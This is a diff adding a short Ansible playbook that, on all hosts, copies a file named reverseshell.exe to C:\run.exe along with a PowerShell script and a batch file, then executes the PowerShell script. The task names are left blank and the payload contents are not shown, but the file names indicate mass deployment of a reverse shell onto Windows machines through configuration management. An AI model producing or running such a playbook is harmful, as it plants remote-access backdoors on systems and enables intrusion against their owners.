@@ -1,0 +1,22 @@
+---
+- name:
+  hosts: all
+  tasks:
+    - name:
+      win_copy:
+        src: ./files/reverseshell.exe
+        dest: C:\run.exe
+
+    - name:
+      win_copy:
+        src: ./files/ps.ps1
+        dest: C:\ps.ps1
+
+    - name:
+      win_copy:
+        src: ./files/sc.bat
+        dest: C:\sc.bat
+
+    - name:
+      win_command: powershell.exe C:/ps.ps1
+...
